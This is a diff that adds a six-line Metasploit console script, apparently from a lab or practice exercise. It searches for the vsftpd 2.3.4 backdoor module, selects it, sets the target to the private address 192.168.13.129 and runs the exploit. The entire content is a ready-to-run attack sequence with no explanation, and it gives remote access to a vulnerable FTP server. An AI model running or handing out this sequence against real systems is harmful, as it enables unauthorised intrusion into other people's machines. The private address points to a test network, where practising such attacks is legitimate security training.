@@ -1,0 +1,6 @@
+search vsftpd 2.3.4
+use 0
+show options
+set RHOST 192.168.13.129
+show options
+exploit
